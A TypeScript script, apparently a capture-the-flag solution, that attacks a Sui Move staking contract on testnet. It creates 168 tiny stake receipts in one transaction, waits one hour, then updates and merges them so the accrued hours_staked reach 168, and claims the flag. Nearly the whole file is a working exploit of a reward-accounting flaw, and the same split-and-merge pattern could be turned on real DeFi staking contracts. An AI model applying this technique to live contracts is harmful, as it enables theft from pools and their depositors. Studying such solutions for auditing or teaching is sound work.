import { SuiJsonRpcClient } from '@mysten/sui/jsonRpc';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import keyPairJson from "../keypair.json" with { type: "json" };

const PACKAGE = "0x936313e502e9cbf6e7a04fe2aeb4c60bc0acd69729acc7a19921b33bebf72d03";
const STAKING_POOL = "0x9cd5b5fe69a62761859536720b9b07c48a1e43b95d8c291855d9fc6779a3b494";
const CLOCK = "0x6";

// Exploit: create N receipts, wait 1 hour, update each (hours_staked += 1 each),
// merge all -> hours_staked = N. With N=168, only 1 hour wait instead of 168 hours!
const NUM_RECEIPTS = 168;
const ONE_SUI = 1_000_000_000; // 1 SUI in MIST

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const client = new SuiJsonRpcClient({ network: 'testnet', url: 'https://fullnode.testnet.sui.io:443' });
const myAddress = keypair.getPublicKey().toSuiAddress();

async function phase1_stake() {
  console.log(`Phase 1: Staking ${NUM_RECEIPTS} receipts in one PTB...`);

  const tx = new Transaction();
  tx.setGasBudget(500_000_000);

  // Split gas coin: 1 SUI for first receipt, 1 MIST each for the rest (167 receipts)
  // Total: 1 SUI + 167 MIST >= MIN_CLAIM_AMOUNT after merging
  const amounts = [ONE_SUI, ...Array(NUM_RECEIPTS - 1).fill(1)];
  const splitCoins = tx.splitCoins(tx.gas, amounts);

  // Stake each coin and collect receipts
  const receipts = amounts.map((_, i) => {
    return tx.moveCall({
      target: `${PACKAGE}::staking::stake`,
      arguments: [tx.object(STAKING_POOL), splitCoins[i], tx.object(CLOCK)],
    });
  });

  tx.transferObjects(receipts, myAddress);

  const result = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx,
    options: { showEffects: true, showObjectChanges: true },
  });

  console.log("Staking done! Digest:", result.digest);

  const receiptIds = (result.objectChanges ?? [])
    .filter((c) => c.type === 'created' && 'objectType' in c && c.objectType?.includes('StakeReceipt'))
    .map((c) => ('objectId' in c ? c.objectId : '') as string);

  console.log(`Created ${receiptIds.length} StakeReceipts`);

  const { writeFile } = await import('fs/promises');
  await writeFile('stake_receipts.json', JSON.stringify({ receiptIds, stakedAt: Date.now() }, null, 2));
  console.log("Saved to stake_receipts.json");
  console.log("\nWait 1 hour, then run: pnpm staking claim");
}

async function phase2_claim(receiptIds: string[]) {
  console.log(`Phase 2: Updating ${receiptIds.length} receipts, merging, and claiming flag...`);

  const tx = new Transaction();
  tx.setGasBudget(500_000_000);

  // Update all receipts to accumulate hours_staked
  const updated = receiptIds.map(id =>
    tx.moveCall({
      target: `${PACKAGE}::staking::update_receipt`,
      arguments: [tx.object(id), tx.object(CLOCK)],
    })
  );

  // Merge pairwise
  let merged = updated[0];
  for (let i = 1; i < updated.length; i++) {
    merged = tx.moveCall({
      target: `${PACKAGE}::staking::merge_receipts`,
      arguments: [merged, updated[i], tx.object(CLOCK)],
    });
  }

  // Claim flag (returns flag + unstaked SUI)
  const claimResult = tx.moveCall({
    target: `${PACKAGE}::staking::claim_flag`,
    arguments: [tx.object(STAKING_POOL), merged, tx.object(CLOCK)],
  });

  tx.transferObjects([claimResult[0], claimResult[1]], myAddress);

  const result = await client.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx,
    options: { showEffects: true },
  });

  console.log("Flag claimed! Digest:", result.digest);
  console.log(`View: https://suiscan.xyz/testnet/tx/${result.digest}`);
}

(async () => {
  const args = process.argv.slice(2);
  const { readFile } = await import('fs/promises');

  // Check for existing receipts
  let savedData: { receiptIds: string[]; stakedAt: number } | null = null;
  try {
    savedData = JSON.parse(await readFile('stake_receipts.json', 'utf-8'));
  } catch { /* no saved state */ }

  if (args[0] === 'claim' || (savedData && (Date.now() - savedData.stakedAt) >= 3_600_000)) {
    if (!savedData) {
      console.error("No stake_receipts.json found. Run 'pnpm staking' first.");
      process.exit(1);
    }
    const hoursElapsed = (Date.now() - savedData.stakedAt) / 3_600_000;
    console.log(`Receipts staked ${hoursElapsed.toFixed(2)} hours ago.`);
    if (hoursElapsed < 1) {
      console.warn(`Only ${hoursElapsed.toFixed(2)} hours elapsed — need at least 1. Each receipt will get 0 hours. Wait longer!`);
      process.exit(1);
    }
    await phase2_claim(savedData.receiptIds);
  } else if (savedData) {
    const hoursElapsed = (Date.now() - savedData.stakedAt) / 3_600_000;
    console.log(`Already staked ${hoursElapsed.toFixed(2)} hours ago. Need 1 hour total. ${(1 - hoursElapsed).toFixed(2)} hours remaining.`);
  } else {
    await phase1_stake();
  }
})();
